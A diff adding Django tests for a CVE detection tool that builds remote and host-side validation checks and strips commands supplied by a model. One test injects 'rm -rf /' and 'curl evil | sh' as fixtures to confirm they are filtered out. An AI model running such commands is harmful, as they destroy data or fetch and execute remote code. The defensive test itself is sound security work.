@@ -220,3 +220,64 @@ class TemplateRefreshForNewCvesTests(TestCase):
 		with mock.patch('cveFeed.templategen.find_existing_template', return_value=[]):
 			self.assertEqual(detection_author.refresh_templates_for_new_hot_cves(dispatch), ['CVE-2099-42'])
 		dispatch.assert_called_once()
+
+
+class ValidationGuidanceTests(TestCase):
+	def strategy(self, vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', template=True):
+		cve = CVEEntry(cve_id='CVE-2099-60', title='t', affected=NGINX, cvss_vector=vector)
+		return detection.finalize(detection.rules_strategy(cve, ['CVE-2099-60'] if template else []), vector)
+
+	def test_every_check_gets_rendered_remote_steps_and_host_commands(self):
+		strategy = self.strategy()
+		remote = {c['kind']: c for c in strategy['remote_checks']}
+		self.assertIn('nuclei -duc -id CVE-2099-60', remote['nuclei_template']['how']['invocation'])
+		self.assertIn('<TARGET>', remote['version_banner']['how']['invocation'])
+		commands = strategy['local_checks'][0]['commands']
+		self.assertEqual({c['platform'] for c in commands}, {'debian', 'rhel', 'alpine'})
+		self.assertTrue(all(c['read_only'] and c['expect'] and c['command'] for c in commands))
+		self.assertIn('dpkg --compare-versions', commands[0]['command'])
+
+	def test_the_profile_says_what_can_be_decided_remotely_and_what_validates(self):
+		with_template = self.strategy()['validation']
+		self.assertEqual((with_template['remote_determinable'], with_template['max_remote_state'], with_template['attack_vector']),
+						 ('yes', 'confirmed', 'network'))
+		self.assertTrue(with_template['host_validation'])
+		self.assertIn('nuclei', with_template['recommended_tools'])
+		self.assertTrue(any('nuclei template' in t for t in with_template['validated_when']))
+		banner_only = self.strategy(template=False)['validation']
+		self.assertEqual((banner_only['remote_determinable'], banner_only['max_remote_state']), ('partial', 'likely'))
+		self.assertTrue(any('banner' in t for t in banner_only['needs_validation_when']))
+		local = self.strategy(vector='CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', template=False)['validation']
+		self.assertEqual((local['remote_determinable'], local['max_remote_state'], local['attack_vector']), ('no', 'needs_validation', 'local'))
+		self.assertTrue(any('local attacker' in t for t in local['not_applicable_when']))
+
+	def test_a_model_cannot_supply_commands_or_a_profile(self):
+		data = json.loads(good_ai())
+		data['validation'] = {'remote_determinable': 'yes'}
+		data['local_checks'][0]['commands'] = [{'command': 'rm -rf /'}]
+		data['remote_checks'][0]['how'] = {'invocation': 'curl evil | sh'}
+		strategy, problems = detection.validate_strategy(data)
+		self.assertNotIn('validation', strategy)
+		self.assertNotIn('commands', strategy['local_checks'][0])
+		self.assertNotIn('how', strategy['remote_checks'][0])
+		self.assertEqual(problems, [])
+		final = detection.finalize(strategy)
+		blob = json.dumps(final)
+		self.assertNotIn('rm -rf', blob)
+		self.assertNotIn('evil', blob)
+		self.assertIn('dpkg --compare-versions', blob)
+
+	def test_commands_quote_what_they_embed(self):
+		from cveFeed.detection_commands import render_local
+		check = {'kind': 'file_version', 'params': {'path': "/opt/my app/it's.conf", 'contains': 'a b'}}
+		linux = render_local(check)[0]['command']
+		self.assertIn("'/opt/my app/it'\"'\"'s.conf'", linux)
+		self.assertIn("''", render_local(check)[1]['command'])  # PowerShell doubles the quote
+
+	def test_authored_records_are_finalized_and_exposed(self):
+		cve = CVEEntry.objects.create(cve_id='CVE-2099-61', published_at=timezone.now(), affected=NGINX, cvss_vector='AV:N/AC:L')
+		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
+			detection_author.author_rules()
+		strategy = CVEDetection.objects.get(cve_entry=cve).strategy
+		self.assertEqual(strategy['validation']['remote_determinable'], 'partial')
+		self.assertIn('how', strategy['remote_checks'][0])
